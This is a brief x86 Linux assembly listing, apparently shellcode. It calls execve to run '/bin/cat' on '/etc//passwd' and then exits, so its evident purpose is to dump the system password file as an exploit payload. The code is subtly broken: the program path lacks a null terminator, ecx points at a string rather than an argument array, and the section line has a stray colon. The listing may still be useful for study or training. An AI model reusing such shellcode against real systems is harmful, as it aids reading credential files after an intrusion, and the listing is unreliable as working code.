[BITS 32]

section .text:
global _start

_start:
push byte 11
pop eax

push 0x7461632f
push 0x6e69622f

mov ebx, esp

push dword 0x64777373
push dword 0x61702f2f
push dword 0x6374652f

mov ecx, esp

xor edx, edx

int 0x80

xor eax, eax
inc eax
xor ebx, ebx

int 0x80
